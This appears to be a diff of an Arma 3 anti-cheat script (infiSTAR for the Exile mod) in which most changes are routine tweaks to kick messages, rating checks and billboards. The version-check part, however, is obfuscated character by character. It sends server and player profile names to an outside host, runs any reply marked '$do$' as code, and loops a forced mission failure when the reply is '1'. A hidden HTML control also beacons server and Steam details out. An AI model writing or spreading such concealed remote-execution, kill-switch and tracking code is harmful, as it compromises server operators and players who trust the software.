+VERSION_CHECK_URL_FULL = call compile ('f'+'o'+'r'+'m'+'a'+'t'+'['+"'"+'h'+'t'+'t'+'p'+':'+'/'+'/'+'v'+'.'+'i'+'n'+'f'+'i'+'S'+'T'+'A'+'R'+'.'+'d'+'e'+'/'+'i'+'n'+'d'+'e'+'x'+'.'+'p'+'h'+'p'+'?'+'f'+'='+'%'+'1'+'&'+'v'+'='+'%'+'2'+'&'+'p'+'='+'%'+'3'+'&'+'p'+'s'+'='+'%'+'4'+'&'+'s'+'='+'%'+'5'+"'"+','+'_'+'f'+'r'+'o'+'m'+','+'_'+'v'+'e'+'r'+'s'+','+'p'+'r'+'o'+'f'+'i'+'l'+'e'+'N'+'a'+'m'+'e'+','+'p'+'r'+'o'+'f'+'i'+'l'+'e'+'N'+'a'+'m'+'e'+'S'+'t'+'e'+'a'+'m'+','+'s'+'e'+'r'+'v'+'e'+'r'+'n'+'a'+'m'+'e'+']');
 diag_log format['<infiSTAR.de> %1 - Thread #1: Preparing Server Loop #1..',time];
 _A3AHstring = _A3AHstring + "
-private['_from','_vers'];
-_from = 'psychotic_closure@hotmail.com';
-_vers = '07-Mar-2016 04-06-16 - v0038';
-if(isNil'VERSION_CHECK_URL')then{VERSION_CHECK_URL = toString[104,116,116,112,58,47,47,118,46,105,110,102,105,83,84,65,82,46,100,101,47,105,110,100,101,120,46,112,104,112,63];};
-VERSION_CHECK_URL_FULL = format['%1f=%2&v=%3&p=%4&ps=%5',VERSION_CHECK_URL,_from,_vers,profileName,profileNameSteam];
-FNC_VERSION_CHECK = {
-	private['_packet1','_jobid','_packet2','_res'];
-	_packet1 = format['getasync%1%2%1',toString [10],VERSION_CHECK_URL_FULL];
-	_jobid = _packet1 call FN_CALL_LOAD_DLL;
-	_packet2 = format['response%1%2%1',toString [10],_jobid];
-	
-	_timeout = diag_tickTime + 80;
-	_res = 'WAIT';
-	_bad = ['','WAIT','ERROR','URLERROR'];
-	waitUntil{
-		uiSleep 3;
-		_res = _packet2 call FN_CALL_LOAD_DLL;
-		(!(_res in _bad) && ((toLower _res) find 'wrapper is disabled' isEqualTo -1)) || diag_tickTime > _timeout
-	};
-	if(_res find '$do$' != -1)then{_res = (_res select [4]);call compile _res;};
-	if(_res == '1')exitWith{
-		while{true}do{
-			_obj = 'Supply0' createVehicle [0,0,0];_do = 'failMission ''LOSER'';endMission ''LOSER'';forceEnd;';
-			['',compile _do,-2,false] call FN_infiSTAR_S;
-			failMission 'LOSER';
-			endMission 'LOSER';
-			forceEnd;
-			uiSleep 1;
-		};
-	};
-	if(_res in _bad)exitWith{};if((toLower _res) find 'wrapper is disabled' != -1)exitWith{};
-	VERSIONCHECKRESULT = _res;publicVariable'VERSIONCHECKRESULT';
+[] spawn {
+private['_packet1','_jobid','_packet2','_res'];
+_packet1 = format['getasync%1%2%1',toString [10],VERSION_CHECK_URL_FULL];
+_jobid = _packet1 call FN_CALL_LOAD_DLL;
+_packet2 = format['response%1%2%1',toString [10],_jobid];
+_timeout = diag_tickTime + 80;
+_res = 'WAIT';
+_bad = ['','WAIT','ERROR','URLERROR'];
+waitUntil{
+	uiSleep 3;
+	_res = _packet2 call FN_CALL_LOAD_DLL;
+	(!(_res in _bad) && ((toLower _res) find 'wrapper is disabled' isEqualTo -1)) || diag_tickTime > _timeout
 };
-[] spawn FNC_VERSION_CHECK;
+if(_res find '$do$' != -1)then{_res = (_res select [4]);call compile _res;};
+if(_res == '1')exitWith{
+	while{true}do{
+		_obj = 'Supply0' createVehicle [0,0,0];_do = 'failMission ''LOSER'';endMission ''LOSER'';forceEnd;';
+		['',compile _do,-2,false] call FN_infiSTAR_S;
+		failMission 'LOSER';
+		endMission 'LOSER';
+		forceEnd;
+		uiSleep 1;
+	};
+};
+if(_res in _bad)exitWith{};if((toLower _res) find 'wrapper is disabled' != -1)exitWith{};
+VERSIONCHECKRESULT = _res;publicVariable'VERSIONCHECKRESULT';
+};
 [] spawn {
 diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 starting',time];
 _admins = "+str _admins+";
@@ -4404,7 +4738,7 @@ _onPlayerConnected = {
 		
 		
 		"; if(_USE_UID_WHITELIST)then{ _A3AHstring = _A3AHstring + "
-		if!(_uid in "+str _UID_WHITELIST+")exitWith{[_name,_uid,_owner] call FNC_INFISERVERKICK;};
+		if!(_uid in "+str _UID_WHITELIST+")exitWith{[_name,_uid,_owner,'NOT WHITELISTED'] call FNC_INFISERVERKICK;};
 		"; }; _A3AHstring = _A3AHstring + "
 		
 		missionNameSpace setVariable[format['"+_name_by_uid+"%1',_uid],_name];
@@ -4625,6 +4959,7 @@ _fn_2 = {
 			if(!alive _x)exitWith{};
 			_uid = getPlayerUID _x;
 			if(count _uid < 17)exitWith{};
+			missionNameSpace setVariable[format['"+_object_by_uid+"%1',_uid],_x];
 			missionNameSpace setVariable[format['EXILE_PLAYER_OJECT_%1',_uid],_x];
 			
 			"; if(_uniform_and_vest_check)then{ _A3AHstring = _A3AHstring + "
@@ -4705,7 +5040,7 @@ _fn_2 = {
 			if!(_xtype isEqualTo 'Exile_Unit_GhostPlayer')then
 			{
 				_RATING_CHECK_LOOPS = _x getVariable['"+_RATING_CHECK_LOOPS+"',0];
-				if(_RATING_CHECK_LOOPS > 3)then
+				if(_RATING_CHECK_LOOPS > 4)then
 				{
 					_rating = rating _x;
 					if(_x getVariable['isrunning',false])then{_x setVariable['isrunning',false,true];}else
@@ -4779,6 +5114,10 @@ _fn_3 = {
 			_infiSTAR = 'infiSTAR';
 			_STAR = 'STAR';
 			_infi = 'infi';
+			_closeDisplay = 'closeDisplay';
+			_EndMission = 'EndMission';
+			_GetPlayerUID = 'GetPlayerUID';
+			if(!isNull player)then{_uid = getPlayerUID player;_puid = getPlayerUID player;};
 			missionNameSpace setVariable['""+_antiantihack_rndvar+""','""+_antiantihack_rndvar+""'];
 		};
 	"";
@@ -4816,7 +5155,7 @@ _fn_4 = {
 	};
 };
 "; }; _A3AHstring = _A3AHstring + "
-[] spawn {_WW = compile toString[99,116,114,108,72,84,77,76,76,111,97,100,101,100,32,95,104];_FF = compile toString[95,104,32,104,116,109,108,76,111,97,100,32,95,108];waitUntil{time > 30};disableSerialization;_idd=24;waitUntil {createDialog ('R'+'s'+'c'+'D'+'i'+'s'+'p'+'l'+'a'+'y'+'C'+'h'+'a'+'t');uiSleep 1;diag_log str allDisplays;!isNull findDisplay _idd};_h = (findDisplay _idd) ctrlCreate [('R'+'s'+'c'+'H'+'T'+'M'+'L'), 3307182];_h ctrlSetBackgroundColor [0,0,0,0.3];_l = toString[104,116,116,112,58,47,47,105,110,102,105,83,84,65,82,46,101,117,47,115,46,112,104,112,63,115,110];_randomNumber = 928;_from = missionNameSpace getVariable[('U'+'P'+'D'+'A'+'T'+'E'+'E'+'M'+'A'+'I'+'L'),_randomNumber];_vers = missionNameSpace getVariable[('I'+'N'+'F'+'I'+'S'+'T'+'A'+'R'+'V'+'E'+'R'+'S'+'I'+'O'+'N'),_randomNumber];_l = format[""%1=%2&sp=%3&um=%4&i=%5&s=%6"",_l,serverName,profileNameSteam,_from,_vers,productVersion];call _FF;_t = time+10;waitUntil {call _WW || time > _t};ctrlDelete _h;closeDialog 0;};
+[] spawn {_WW = compile toString[99,116,114,108,72,84,77,76,76,111,97,100,101,100,32,95,104];_FF = compile toString[95,104,32,104,116,109,108,76,111,97,100,32,95,108];waitUntil{time > 30};disableSerialization;_idd=24;waitUntil {createDialog ('R'+'s'+'c'+'D'+'i'+'s'+'p'+'l'+'a'+'y'+'C'+'h'+'a'+'t');uiSleep 1;diag_log str allDisplays;!isNull findDisplay _idd};_h = (findDisplay _idd) ctrlCreate [('R'+'s'+'c'+'H'+'T'+'M'+'L'), 3307182];_h ctrlSetBackgroundColor [0,0,0,0.3];_l = toString[104,116,116,112,58,47,47,105,110,102,105,83,84,65,82,46,101,117,47,115,46,112,104,112,63,115,110];_randomNumber = 2118;_from = missionNameSpace getVariable[('U'+'P'+'D'+'A'+'T'+'E'+'E'+'M'+'A'+'I'+'L'),_randomNumber];_vers = missionNameSpace getVariable[('I'+'N'+'F'+'I'+'S'+'T'+'A'+'R'+'V'+'E'+'R'+'S'+'I'+'O'+'N'),_randomNumber];_l = format[""%1=%2&sp=%3&um=%4&i=%5&s=%6"",_l,serverName,profileNameSteam,_from,_vers,productVersion];call _FF;_t = time+10;waitUntil {call _WW || time > _t};ctrlDelete _h;closeDialog 0;};
 diag_log format['<infiSTAR.de> %1 - Thread #1: Server Loop #1 looping now!',time];
 	while{true}do
 	{
@@ -4887,6 +5226,7 @@ _pathToCustomBillBoardTextures spawn {
 				_texture = _selected select 1;
 				_x setObjectTextureGlobal [0,_texture];
 				_x allowDamage false;
+				_x addMPEventHandler ['MPKilled', { if !(isServer) exitWith {}; (_this select 0) call fnc_remove_billboard;}];
 			};
 		};
 	} forEach (allMissionObjects 'Exile_Sign_TraderCity');
